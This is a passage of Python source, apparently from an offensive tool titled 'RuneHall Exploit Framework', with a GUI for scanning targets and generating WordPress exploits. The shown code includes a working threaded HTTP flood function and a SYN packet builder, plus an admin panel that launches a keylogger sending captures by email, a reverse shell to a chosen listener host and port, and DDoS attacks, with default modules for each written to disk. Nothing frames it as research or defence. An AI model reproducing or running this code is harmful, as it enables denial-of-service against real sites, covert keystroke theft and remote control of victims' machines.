ip_header<br><br>def create_tcp_header(source_port, dest_port):<br>    tcp_source = source_port<br>    tcp_dest = dest_port<br>    tcp_seq = random.randint(1, 4294967295)<br>    tcp_ack_seq = 0<br>    tcp_doff = 5<br>    tcp_fin = 0<br>    tcp_syn = 1<br>    tcp_rst = 0<br>    tcp_psh = 0<br>    tcp_ack = 0<br>    tcp_urg = 0<br>    tcp_window = socket.htons(5840)<br>    tcp_check = 0<br>    tcp_urg_ptr = 0<br>    <br>    tcp_offset_res = (tcp_doff << 4)<br>    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)<br>    <br>    tcp_header = struct.pack('!HHLLBBHHH', <br>        tcp_source, <br>        tcp_dest, <br>        tcp_seq, <br>        tcp_ack_seq, <br>        tcp_offset_res, <br>        tcp_flags, <br>        tcp_window, <br>        tcp_check, <br>        tcp_urg_ptr<br>    )<br>    return tcp_header<br><br>def http_flood(ip, port, threads, duration, log_callback):<br>    log_callback(f"Starting HTTP flood with {threads} threads for {duration} seconds", "DDoS")<br>    user_agents = [<br>        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",<br>        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",<br>        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"<br>    ]<br>    <br>    def attack():<br>        start_time = time.time()<br>        while time.time() - start_time < duration:<br>            try:<br>                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>                s.connect((ip, port))<br>                <br>                # Send HTTP request<br>                request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\\r\\n"<br>                request += f"Host: {ip}\\r\\n"<br>                request += f"User-Agent: {random.choice(user_agents)}\\r\\n"<br>                request += "Connection: keep-alive\\r\\n\\r\\n"<br>                <br>                s.send(request.encode())<br>            except:<br>                pass<br>    <br>    for _ in range(threads):<br>        threading.Thread(target=attack, daemon=True).start()<br>    <br>    time.sleep(duration)<br>    log_callback("HTTP flood completed", "DDoS")<br><br>def create_file_manager_window(output_dir):<br>    """Create enhanced file manager window"""<br>    # Build tree data<br>    tree_data = sg.TreeData()<br>    tree_data.Insert("", "output", "Scan Results", [])<br>    <br>    for root, dirs, files in os.walk(output_dir):<br>        rel_root = os.path.relpath(root, output_dir)<br>        if rel_root == ".":<br>            parent_key = "output"<br>        else:<br>            parent_key = rel_root.replace(os.sep, "_")<br>            tree_data.Insert("output", parent_key, rel_root, [])<br>        <br>        for file in files:<br>            file_path = os.path.join(root, file)<br>            file_size = os.path.getsize(file_path)<br>            file_key = f"file_{len(tree_data.tree_dict)}"<br>            tree_data.Insert(parent_key, file_key, file, [f"{file_size} bytes"])<br><br>    layout = [<br>        [sg.Text("RHEF Scan Results Explorer", font=("Helvetica", 16))],<br>        [sg.Tree(data=tree_data,<br>                 headings=['Size'],<br>                 auto_size_columns=True,<br>                 num_rows=20,<br>                 col0_width=40,<br>                 key='-TREE-',<br>                 show_expanded=False,<br>                 enable_events=True)],<br>        [sg.Multiline(size=(80, 15), key='-PREVIEW-', disabled=True)],<br>        [sg.Button("Open File"), sg.Button("Open in Browser"), sg.Button("Delete"), sg.Button("Close")]<br>    ]<br>    <br>    return sg.Window("RHEF File Manager", layout, finalize=True)<br><br>def create_admin_panel():<br>    """Create administrative tools panel"""<br>    layout = [<br>        [sg.Text("Administrative Tools", font=("Helvetica", 16))],<br>        [sg.Frame("Keylogger", [<br>            [sg.Text("Email:"), sg.Input(key='-KL-EMAIL-', size=(25,1)),<br>             sg.Text("Password:"), sg.Input(key='-KL-PASSWORD-', password_char='*', size=(20,1))],<br>            [sg.Text("Interval (sec):"), sg.Input(key='-KL-INTERVAL-', size=(8,1), default_text="300")],<br>            [sg.Button("Start Keylogger", key='-START-KEYLOGGER-'), <br>             sg.Button("Stop Keylogger", key='-STOP-KEYLOGGER-')]<br>        ])],<br>        <br>        [sg.Frame("Reverse Shell", [<br>            [sg.Text("LHOST:"), sg.Input(key='-RS-LHOST-', size=(20,1)),<br>             sg.Text("LPORT:"), sg.Input(key='-RS-LPORT-', size=(8,1), default_text="4444")],<br>            [sg.Radio("Python", "RADIO1", default=True, key='-RS-PYTHON-'),<br>             sg.Radio("SSH", "RADIO1", key='-RS-SSH-')],<br>            [sg.Button("Start Reverse Shell", key='-START-REVERSE-')]<br>        ])],<br>        <br>        [sg.Frame("DDoS Attack", [<br>            [sg.Text("Target IP:"), sg.Input(key='-DDOS-IP-', size=(20,1)),<br>             sg.Text("Port:"), sg.Input(key='-DDOS-PORT-', size=(8,1), default_text="80")],<br>            [sg.Text("Type:"), <br>             sg.Combo(['syn', 'http'], default_value='syn', key='-DDOS-TYPE-', size=(10,1)),<br>             sg.Text("Threads:"), sg.Input(key='-DDOS-THREADS-', size=(8,1), default_text="100"),<br>             sg.Text("Duration:"), sg.Input(key='-DDOS-DURATION-', size=(8,1), default_text="60")],<br>            [sg.Button("Launch Attack", key='-START-DDOS-')]<br>        ])],<br>        <br>        [sg.Button("Close", size=(10,1))]<br>    ]<br>    <br>    return sg.Window("RHEF Administrative Panel", layout, finalize=True)<br><br>def create_module_gui():<br>    layout = [<br>        [sg.Text("Create New Custom Module", font=("Helvetica", 16))],<br>        [sg.Text("Module Name:"), sg.Input(key='-MODULE-NAME-')],<br>        [sg.Multiline(CUSTOM_MODULE_TEMPLATE, size=(70, 25), key='-MODULE-CODE-')],<br>        [sg.Button("Save"), sg.Button("Cancel")]<br>    ]<br>    return sg.Window("Custom Module Creator", layout, modal=True)<br><br>def create_gui():<br>    sg.theme('DarkGrey5')<br>    <br>    # Custom module list<br>    custom_modules = [f[:-3] for f in os.listdir(MODULES_DIR) if f.endswith('.py')]<br>    <br>    layout = [<br>        [sg.Text("RuneHall Exploit Framework", font=("Helvetica", 20), justification='center')],<br>        [sg.Text(f"Version: {VERSION}", font=("Helvetica", 10))],<br>        [sg.HorizontalSeparator()],<br>        <br>        [sg.Text("Target URL/IP:", size=(15,1)), <br>         sg.InputText(key='-TARGET-', size=(50,1))],<br>        <br>        [sg.Frame("Scan Options", [<br>            [sg.Checkbox("CMS Detection", key='-CMS-', default=True),<br>             sg.Checkbox("Full Pentest", key='-FULL-')],<br>            [sg.Checkbox("Vulnerability Scan", key='-VULN-'),<br>             sg.Checkbox("Exploit Generation", key='-EXPLOIT-', default=True)],<br>        ])],<br>        <br>        [sg.Frame("Custom Modules", [<br>            [sg.Text("Available Modules:"),<br>             sg.Combo(custom_modules, key='-MODULE-LIST-', size=(20,1), enable_events=True),<br>             sg.Button("Create New Module", key='-CREATE-MODULE-')],<br>            [sg.Text("Module Arguments:"), <br>             sg.InputText(key='-MODULE-ARGS-', size=(40,1))],<br>            [sg.Button("Run Module", key='-RUN-MODULE-', disabled=len(custom_modules)==0)]<br>        ])],<br>        <br>        [sg.Frame("Output", [<br>            [sg.Multiline(size=(80, 15), key='-OUTPUT-', autoscroll=True, disabled=True)],<br>            [sg.Button("Clear Log"), <br>             sg.Button("Open File Manager"),<br>             sg.Button("Open Admin Panel"),<br>             sg.Button("Save Log As")]<br>        ])],<br>        <br>        [sg.ProgressBar(100, orientation='h', size=(50,20), key='-PROGRESS-')],<br>        [sg.Button("Start Scan", size=(10,1), button_color=('white', 'green')),<br>         sg.Button("Stop Scan", key='-STOP-', disabled=True),<br>         sg.Button("Exit", size=(10,1), button_color=('white', 'red'))]<br>    ]<br>    <br>    window = sg.Window(f"RHEF {VERSION} - RuneHall.com", layout, finalize=True)<br>    return window<br><br>def main_gui():<br>    # Create GUI<br>    window = create_gui()<br>    rhef_core = None<br>    scan_thread = None<br>    <br>    # Event loop<br>    while True:<br>        event, values = window.read(timeout=100)<br>        <br>        if event in (sg.WIN_CLOSED, 'Exit'):<br>            break<br>            <br>        elif event == 'Start Scan':<br>            target = values['-TARGET-']<br>            if not target:<br>                sg.popup_error("Please enter a target!")<br>                continue<br>                <br>            if not target.startswith('http'):<br>                target = 'http://' + target<br>                <br>            window['-OUTPUT-'].update("")<br>            window['Start Scan'].update(disabled=True)<br>            window['-STOP-'].update(disabled=False)<br>            <br>            # Initialize core<br>            rhef_core = RHEFCore(target, log_callback=lambda msg, mod: window.write_event_value('-LOG-', (msg, mod)))<br>            rhef_core.init_environment()<br>            <br>            # Start scan in new thread<br>            def scan_job():<br>                try:<br>                    if values['-CMS-']:<br>                        rhef_core.detect_cms()<br>                    <br>                    if values['-FULL-']:<br>                        rhef_core.comprehensive_scan()<br>                    <br>                    if values['-EXPLOIT-'] and rhef_core.cms_data.get('type') == 'WordPress':<br>                        rhef_core.generate_exploits()<br>                        <br>                except Exception as e:<br>                    window.write_event_value('-LOG-', (f"Scan failed: {str(e)}", "ERROR"))<br>                finally:<br>                    window.write_event_value('-SCAN-COMPLETE-', None)<br>            <br>            scan_thread = threading.Thread(target=scan_job, daemon=True)<br>            scan_thread.start()<br>            <br>        elif event == '-STOP-':<br>            if rhef_core:<br>                rhef_core.scan_active = False<br>            window['Start Scan'].update(disabled=False)<br>            window['-STOP-'].update(disabled=True)<br>            <br>        elif event == '-LOG-':<br>            msg, module = values[event]<br>            timestamp = datetime.now().strftime("%H:%M:%S")<br>            window['-OUTPUT-'].print(f"[{timestamp}] [{module}] {msg}")<br>            <br>        elif event == '-SCAN-COMPLETE-':<br>            window['-OUTPUT-'].print("\n[SCAN COMPLETED SUCCESSFULLY]")<br>            window['Start Scan'].update(disabled=False)<br>            window['-STOP-'].update(disabled=True)<br>            <br>        elif event == 'Clear Log':<br>            window['-OUTPUT-'].update("")<br>            <br>        elif event == 'Open File Manager':<br>            file_manager_window = create_file_manager_window(OUTPUT_DIR)<br>            tree_data = file_manager_window['-TREE-'].TreeData<br>            while True:<br>                f_event, f_values = file_manager_window.read()<br>                if f_event in (sg.WIN_CLOSED, 'Close'):<br>                    break<br>                elif f_event == '-TREE-':<br>                    selected = f_values['-TREE-'][0]<br>                    if selected.startswith("file_"):<br>                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)<br>                        try:<br>                            with open(file_path, 'r') as f:<br>                                content = f.read(5000)  # Limit preview to 5000 chars<br>                                file_manager_window['-PREVIEW-'].update(content)<br>                        except:<br>                            file_manager_window['-PREVIEW-'].update("Binary file - cannot preview")<br>                elif f_event == 'Open File':<br>                    selected = f_values['-TREE-'][0]<br>                    if selected.startswith("file_"):<br>                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)<br>                        if sys.platform == "win32":<br>                            os.startfile(file_path)<br>                        else:<br>                            subprocess.Popen(['xdg-open', file_path])<br>                elif f_event == 'Open in Browser':<br>                    selected = f_values['-TREE-'][0]<br>                    if selected.startswith("file_"):<br>                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)<br>                        if file_path.endswith(('.html', '.htm')):<br>                            webbrowser.open(f"file://{file_path}")<br>                elif f_event == 'Delete':<br>                    selected = f_values['-TREE-'][0]<br>                    if selected.startswith("file_"):<br>                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)<br>                        try:<br>                            os.remove(file_path)<br>                            sg.popup(f"Deleted: {file_path}")<br>                            # Refresh tree<br>                            file_manager_window.close()<br>                            file_manager_window = create_file_manager_window(OUTPUT_DIR)<br>                            tree_data = file_manager_window['-TREE-'].TreeData<br>                        except Exception as e:<br>                            sg.popup_error(f"Delete failed: {str(e)}")<br>            file_manager_window.close()<br>            <br>        elif event == '-CREATE-MODULE-':<br>            module_window = create_module_gui()<br>            while True:<br>                mod_event, mod_values = module_window.read()<br>                if mod_event in (sg.WIN_CLOSED, 'Cancel'):<br>                    break<br>                elif mod_event == 'Save':<br>                    module_name = mod_values['-MODULE-NAME-']<br>                    if not module_name:<br>                        sg.popup_error("Module name is required!")<br>                        continue<br>                    module_path = os.path.join(MODULES_DIR, f"{module_name}.py")<br>                    with open(module_path, 'w') as f:<br>                        f.write(mod_values['-MODULE-CODE-'])<br>                    sg.popup(f"Module saved: {module_path}")<br>                    # Refresh module list<br>                    custom_modules = [f[:-3] for f in os.listdir(MODULES_DIR) if f.endswith('.py')]<br>                    window['-MODULE-LIST-'].update(values=custom_modules)<br>                    window['-RUN-MODULE-'].update(disabled=len(custom_modules)==0)<br>                    break<br>            module_window.close()<br>            <br>        elif event == '-RUN-MODULE-':<br>            module_name = values['-MODULE-LIST-']<br>            if not module_name:<br>                sg.popup_error("Select a module first!")<br>                continue<br>                <br>            target = values['-TARGET-']<br>            if not target:<br>                sg.popup_error("Please enter a target!")<br>                continue<br>                <br>            if not target.startswith('http'):<br>                target = 'http://' + target<br>                <br>            window['-OUTPUT-'].update("")<br>            rhef_core = RHEFCore(target, log_callback=lambda msg, mod: window.write_event_value('-LOG-', (msg, mod)))<br>            rhef_core.init_environment()<br>            <br>            # Parse module arguments<br>            args = {}<br>            arg_str = values['-MODULE-ARGS-']<br>            if arg_str:<br>                for pair in arg_str.split(';'):<br>                    if '=' in pair:<br>                        key, value = pair.split('=', 1)<br>                        args[key.strip()] = value.strip()<br>            <br>            # Start module in new thread<br>            def module_job():<br>                try:<br>                    rhef_core.run_custom_module(module_name, args)<br>                except Exception as e:<br>                    window.write_event_value('-LOG-', (f"Module failed: {str(e)}", "ERROR"))<br>                finally:<br>                    window.write_event_value('-MODULE-COMPLETE-', None)<br>            <br>            threading.Thread(target=module_job, daemon=True).start()<br>            <br>        elif event == '-MODULE-COMPLETE-':<br>            window['-OUTPUT-'].print("\n[MODULE EXECUTION COMPLETED]")<br>            <br>        elif event == 'Open Admin Panel':<br>            admin_window = create_admin_panel()<br>            while True:<br>                a_event, a_values = admin_window.read()<br>                if a_event in (sg.WIN_CLOSED, 'Close'):<br>                    break<br>                elif a_event == '-START-KEYLOGGER-':<br>                    email = a_values['-KL-EMAIL-']<br>                    password = a_values['-KL-PASSWORD-']<br>                    interval = int(a_values['-KL-INTERVAL-']) if a_values['-KL-INTERVAL-'] else 300<br>                    if rhef_core:<br>                        rhef_core.start_keylogger(email, password, interval)<br>                elif a_event == '-STOP-KEYLOGGER-':<br>                    if rhef_core:<br>                        rhef_core.stop_keylogger()<br>                elif a_event == '-START-REVERSE-':<br>                    lhost = a_values['-RS-LHOST-']<br>                    lport = int(a_values['-RS-LPORT-']) if a_values['-RS-LPORT-'] else 4444<br>                    shell_type = "python" if a_values['-RS-PYTHON-'] else "ssh"<br>                    if rhef_core:<br>                        rhef_core.start_reverse_shell(lhost, lport, shell_type)<br>                elif a_event == '-START-DDOS-':<br>                    target_ip = a_values['-DDOS-IP-']<br>                    target_port = int(a_values['-DDOS-PORT-']) if a_values['-DDOS-PORT-'] else 80<br>                    attack_type = a_values['-DDOS-TYPE-']<br>                    threads = int(a_values['-DDOS-THREADS-']) if a_values['-DDOS-THREADS-'] else 100<br>                    duration = int(a_values['-DDOS-DURATION-']) if a_values['-DDOS-DURATION-'] else 60<br>                    if rhef_core:<br>                        rhef_core.start_ddos_attack(target_ip, target_port, attack_type, threads, duration)<br>            admin_window.close()<br>            <br>    window.close()<br><br>if __name__ == "__main__":<br>    # Create default custom modules if none exist<br>    if not os.listdir(MODULES_DIR):<br>        for name, template in [<br>            ('keylogger', KEYLOGGER_TEMPLATE),<br>            ('reverse_shell', REVERSE_SHELL_TEMPLATE),<br>            ('ddos_attack', DDOS_TEMPLATE)<br>        ]:<br>            with open(os.path.join(MODULES_DIR, f"{name}.py"), 'w') as f:<br>                f.write(template)<br>    <br>    # Check for GUI mode<br>    if '--gui' in sys.argv:<br>        main_gui()<br>    else:<br>        # CLI mode (simplified version)<br>        print(f"RHEF {VERSION} - CLI Mode")<br>        print("Note: GUI mode is recommended for full features (use --gui)")<br>        target = input("Enter target URL/IP: ").strip()<br>        if not target.startswith('http'):<br>            target = 'http://' + target<br>            <br>        core = RHEFCore(target)<br>        core.init_environment()<br>        <br>        # Run basic scan<br>        core.detect_cms()<br>        core.comprehensive_scan()<br>        <br>        print(f"\n[+] Scan completed. Results saved to {core.output_file}")<br>        print(f"[+] Output directory: {OUTPUT_DIR}")</body></html>